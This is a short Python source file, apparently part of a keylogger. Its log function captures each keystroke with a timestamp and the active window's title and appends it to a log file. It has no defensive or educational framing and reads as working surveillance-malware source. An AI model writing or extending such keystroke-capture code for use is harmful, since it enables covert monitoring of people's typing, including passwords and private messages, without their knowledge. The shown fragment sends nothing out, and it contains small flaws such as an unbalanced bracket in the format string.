from keys import *
import config
from datetime import datetime 
import pygetwindow as gw

def log(key, file):
    format = str()
    key_char = None
    key_code = None
    window = gw.getActiveWindowTitle()
    date = datetime.now()

    if hasattr(key, 'char'):
        key_char = key.char
        format = "[[{:%Y-%m-%d %H:%M:%S}] [{}] {}\n".format(date, window, key_char)
    else:
        format = "[[{:%Y-%m-%d %H:%M:%S}] [{}] {}\n".format(date, window, key)
    
    file.write(format)





        
 

    




